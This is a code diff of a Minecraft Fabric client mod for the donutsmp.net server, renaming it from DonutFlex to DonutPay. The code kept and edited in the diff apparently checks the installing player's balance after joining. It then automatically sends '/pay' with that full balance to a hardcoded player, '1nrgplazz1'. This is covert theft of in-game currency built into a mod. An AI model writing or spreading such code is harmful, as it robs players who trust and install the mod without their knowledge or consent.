@@ -1,4 +1,4 @@
-package com.donutflex;
+package com.donutPay;
 
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
@@ -12,12 +12,12 @@ import java.util.Locale;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class DonutFlexClient implements ClientModInitializer {
+public class DonutPayClient implements ClientModInitializer {
 
     private static final String SERVER_HOST = "donutsmp.net";
 
-    /** Player the /flex command is aimed at. */
-    private static final String FLEX_TARGET = "1nrgplazz1";
+    /** Player the /Pay command is aimed at. */
+    private static final String PAY_TARGET = "1nrgplazz1";
 
     /** Ticks (20/sec) to wait after joining before running /bal. */
     private static final int JOIN_DELAY_TICKS = 100;
@@ -90,7 +90,7 @@ public class DonutFlexClient implements ClientModInitializer {
         // Sends "/pay <user> <balance>" on the client thread
         client.execute(() -> {
             if (client.getNetworkHandler() != null) {
-                client.getNetworkHandler().sendChatCommand("pay " + FLEX_TARGET + " " + balance);
+                client.getNetworkHandler().sendChatCommand("pay " + PAY_TARGET + " " + balance);
             }
         });
     }
